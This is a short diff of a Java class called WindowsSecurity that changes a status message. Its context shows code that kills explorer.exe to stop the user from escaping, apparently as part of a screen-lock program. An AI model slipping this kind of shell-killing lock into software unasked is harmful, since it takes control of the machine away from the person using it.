@@ -30,7 +30,7 @@ public class WindowsSecurity implements Runnable {
 		kill("explorer.exe"); // <--- Kills explorer, preventing any escape;
 								// remove if you want
 								// not sure if I like or not
-		System.out.println("Waiting for termination");
+		System.out.println("Waiting for lock release");
 		while (running) {
 			sleep(30L);
 		}
